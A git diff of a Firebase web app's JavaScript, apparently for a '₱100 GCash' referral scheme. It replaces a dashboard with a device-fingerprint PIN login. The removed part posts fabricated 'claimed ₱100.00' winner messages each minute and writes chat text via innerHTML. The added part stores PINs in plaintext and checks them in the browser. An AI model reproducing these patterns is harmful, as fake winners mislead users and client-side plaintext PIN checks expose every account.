@@ -1,8 +1,5 @@
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-import { 
-    getFirestore, doc, getDoc, collection, addDoc, 
-    onSnapshot, query, orderBy, limit, serverTimestamp 
-} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
 const firebaseConfig = {
     apiKey: "AIzaSyAK5I_7WeKouFM08SeOZcDHrXsgckYoULg",
@@ -10,174 +7,123 @@ const firebaseConfig = {
     projectId: "get100-8333e",
     storageBucket: "get100-8333e.firebasestorage.app",
     messagingSenderId: "242341429618",
-    appId: "1:242341429618:web:c596b279f746dc22851deb"
+    appId: "1:242341429618:web:c596b279f746dc22851deb",
+    measurementId: "G-Y8TW2M3494"
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
-const activeUser = localStorage.getItem('active_user');
 
-const POST_COOLDOWN = 10 * 60 * 1000; // 10 mins
+let step = 0; 
+let tempKey = "", confirmKey = "", mobileNum = "", dbKey = "";
+const getSignature = () => btoa(navigator.userAgent + screen.width + screen.height);
 
-async function init() {
-    if (!activeUser) { window.location.href = "index.html"; return; }
-    
-    // UI Setup
-    document.getElementById('displayUserID').innerText = activeUser;
-    document.getElementById('gcashPrefix').value = activeUser;
+window.onload = () => setTimeout(checkDevice, 2000);
 
-    // 1. REAL-TIME BALANCE
-    onSnapshot(doc(db, "users", activeUser), (snap) => {
-        if (snap.exists()) {
-            const data = snap.data();
-            const bal = (data.earnings || 0).toFixed(2);
-            document.getElementById('mainBalance').innerText = bal;
-            document.getElementById('withdrawAmount').value = bal;
-            if (data.Referral_status === "Redeem") {
-                const rs = document.getElementById('redeemSection');
-                if(rs) rs.classList.add('hidden');
-            }
-        }
-    });
+async function checkDevice() {
+    const signature = getSignature();
+      try {
+           const sigSnap = await getDoc(doc(db, "signatures", signature));
+        document.getElementById('scan-layer').classList.add('hidden');
+        document.getElementById('auth-layer').classList.remove('hidden');
 
-    startLiveFeed();
-    updatePostButton();
-}
-
-// 2. MODAL TOGGLES
-const wModal = document.getElementById('withdrawModal');
-const iModal = document.getElementById('inviteModal');
-
-document.getElementById('openWithdraw').onclick = () => wModal.style.display = 'flex';
-document.getElementById('closeWithdraw').onclick = () => wModal.style.display = 'none';
-
-document.getElementById('openInvite').onclick = () => iModal.style.display = 'flex';
-document.getElementById('closeModal').onclick = () => iModal.style.display = 'none';
-
-// 3. GCASH LOGIC & CHANGE NUMBER (X Icon)
-const changeNumBtn = document.getElementById('changeNumber');
-const gcashPrefix = document.getElementById('gcashPrefix');
-const gcashConfirm = document.getElementById('gcashConfirm');
-const btnClaim = document.getElementById('btnClaimGcash');
-
-changeNumBtn.onclick = function() {
-    if (gcashPrefix.readOnly) {
-        gcashPrefix.readOnly = false;
-        gcashPrefix.classList.remove('locked');
-        gcashPrefix.focus();
-        this.classList.replace('fa-circle-xmark', 'fa-circle-check');
-        this.style.color = 'var(--success)';
-    } else {
-        gcashPrefix.readOnly = true;
-        gcashPrefix.classList.add('locked');
-        this.classList.replace('fa-circle-check', 'fa-circle-xmark');
-        this.style.color = 'var(--warning)';
-    }
-    validateClaim(); // Re-validate on lock/unlock
-};
-
-gcashConfirm.oninput = validateClaim;
-
-function validateClaim() {
-    if (gcashConfirm.value === gcashPrefix.value && gcashPrefix.value.trim() !== '') {
-        btnClaim.disabled = false;
-    } else {
-        btnClaim.disabled = true;
-    }
-}
-
-// 4. LIVE FEED LOGIC (Bottom to Top via CSS flex-direction: column-reverse)
-function addFeedItem(text, type, senderID = "") {
-    const logs = document.getElementById('chatLogs');
-    const div = document.createElement('div');
-    const isMe = senderID === activeUser;
-    
-    // Classes: 'msg', then 'winner-msg', 'my-msg', or 'user-msg'
-    let specificClass = 'user-msg';
-    if (type === 'winner') specificClass = 'winner-msg';
-    else if (isMe) specificClass = 'my-msg';
-
-    div.className = `msg ${specificClass}`;
-    div.innerHTML = text;
-    
-    logs.prepend(div); 
-    if (logs.childNodes.length > 20) logs.removeChild(logs.lastChild);
-}
-
-function spawnWinner() {
-    const randID = "09" + Math.floor(Math.random()*90+10) + "****" + Math.floor(1000+Math.random()*9000);
-    addFeedItem(`<i class="fa-solid fa-gift"></i> User ${randID} claimed ₱100.00 GCash!`, 'winner');
-}
-
-function startLiveFeed() {
-    const q = query(collection(db, "chatlogs"), orderBy("timestamp", "desc"), limit(10));
-    onSnapshot(q, (snapshot) => {
-        snapshot.docChanges().forEach((change) => {
-            if (change.type === "added") {
-                const data = change.doc.data();
-                addFeedItem(data.text, 'user', data.sender);
-            }
-        });
-    });
-
-    spawnWinner();
-    setInterval(spawnWinner, 60000); // 1 min bot
-}
-
-// 5. POST REFERRAL LOGIC
-function updatePostButton() {
-    const lastPost = localStorage.getItem('last_post_time');
-    const btn = document.getElementById('btnPostRef');
-    const timerBox = document.getElementById('cooldownTimer');
-    
-    if (lastPost) {
-        const remaining = parseInt(lastPost) + POST_COOLDOWN - Date.now();
-        if (remaining > 0) {
-            btn.disabled = true;
-            timerBox.classList.remove('hidden');
-            runCountdown(remaining);
-            return;
-        }
-    }
-    btn.disabled = false;
-    timerBox.classList.add('hidden');
-}
-
-function runCountdown(ms) {
-    const span = document.getElementById('timer');
-    const int = setInterval(() => {
-        const nowRemaining = parseInt(localStorage.getItem('last_post_time')) + POST_COOLDOWN - Date.now();
-        if (nowRemaining <= 0) {
-            clearInterval(int);
-            updatePostButton();
+        if (sigSnap.exists()) {
+            mobileNum = sigSnap.data().owner;
+             const userSnap = await getDoc(doc(db, "users", mobileNum));
+            if (userSnap.exists()) {
+                dbKey = userSnap.data().secretKey;
+                setupLoginUI();
+                 }
         } else {
-            const m = Math.floor(nowRemaining / 60000);
-            const s = Math.floor((nowRemaining % 60000) / 1000);
-            span.innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+            setupRegisterUI();
         }
-    }, 1000);
+    } catch (e) {
+          document.getElementById('ui-subtitle').innerText = "Check Firestore Connection/Rules";
+    }
 }
 
-document.getElementById('btnPostRef').onclick = async () => {
-    try {
-        const userSnap = await getDoc(doc(db, "users", activeUser));
-        if (!userSnap.exists()) return;
+function setupLoginUI() {
+    step = 4;
+    document.getElementById('ui-title').innerText = "SECURE LOGIN";
+    document.getElementById('ui-subtitle').innerText = "Welcome back!";
+    document.getElementById('user-badge').classList.remove('hidden');
+    document.getElementById('mobile-box').classList.add('hidden');
+    document.getElementById('keypad-section').classList.remove('hidden');
+    document.getElementById('masked-id').innerText = mobileNum.substring(0,2) + "****" + mobileNum.substring(7);
+}
 
-        const code = userSnap.data().referralCode || "GET100";
-        const last5 = activeUser.slice(-5);
-        const postText = `User[${last5}]: Join using my code <b>${code}</b> 🌿`;
+function setupRegisterUI() {
+    step = 1;
+    document.getElementById('ui-title').innerText = "REGISTER DEVICE";
+     document.getElementById('mobile-box').classList.remove('hidden');
+}
 
-        await addDoc(collection(db, "chatlogs"), {
-            text: postText,
-            sender: activeUser,
-            timestamp: serverTimestamp()
-        });
+// Keypad Actions
+document.querySelectorAll('.key').forEach(k => {
+    k.onclick = () => {
+        const val = k.dataset.val;
+        if (step === 4) handleLogin(val);
+        else handleRegistration(val);
+    };
+});
 
-        localStorage.setItem('last_post_time', Date.now().toString());
-        updatePostButton();
-    } catch (err) {
-        console.error("Post Error:", err);
+function handleLogin(val) {
+    if (tempKey.length < 6) {
+        tempKey += val;
+        updateDots(tempKey.length);
+        if (tempKey.length === 6) {
+            if (tempKey === dbKey) {
+                localStorage.setItem('active_user', mobileNum);
+                window.location.href = "main.html";
+            } else {
+                  alert("Wrong PIN");
+                tempKey = ""; resetDots();
+            }
+        }
+    }
+}
+
+function handleRegistration(val) {
+    if (step === 2) {
+        tempKey += val;
+        updateDots(tempKey.length);
+        if (tempKey.length === 6) { step = 3; resetDots(); document.getElementById('ui-subtitle').innerText = "Confirm PIN"; }
+    } else if (step === 3) {
+        confirmKey += val;
+        updateDots(confirmKey.length);
+        if (confirmKey.length === 6) {
+            if (tempKey === confirmKey) {
+                document.getElementById('btnAction').classList.remove('hidden');
+                document.getElementById('ui-subtitle').innerText = "PIN Match!";
+            } else {
+                alert("Mismatch!"); resetDots(); tempKey = ""; confirmKey = ""; step = 2;
+            }
+        }
+    }
+}
+
+document.getElementById('mobile').oninput = (e) => {
+     if (e.target.value.length === 11) {
+        mobileNum = e.target.value;
+        document.getElementById('mobile-box').classList.add('hidden');
+        document.getElementById('keypad-section').classList.remove('hidden');
+         step = 2;
     }
 };
 
-window.onload = init;
+document.getElementById('btnAction').onclick = async () => {
+    const sig = getSignature();
+    const myRef = Math.random().toString(36).substring(2, 8).toUpperCase();
+    await setDoc(doc(db, "users", mobileNum), { 
+        secretKey: tempKey, 
+        earnings: 0, 
+        referralCode: myRef, 
+        registeredAt: new Date().toISOString() 
+    });
+    await setDoc(doc(db, "signatures", sig), { owner: mobileNum });
+    localStorage.setItem('active_user', mobileNum);
+    window.location.href = "main.html";
+};
+
+function updateDots(l) { document.querySelectorAll('.dot').forEach((d, i) => i < l ? d.classList.add('active') : d.classList.remove('active')); }
+function resetDots() { document.querySelectorAll('.dot').forEach(d => d.classList.remove('active')); }
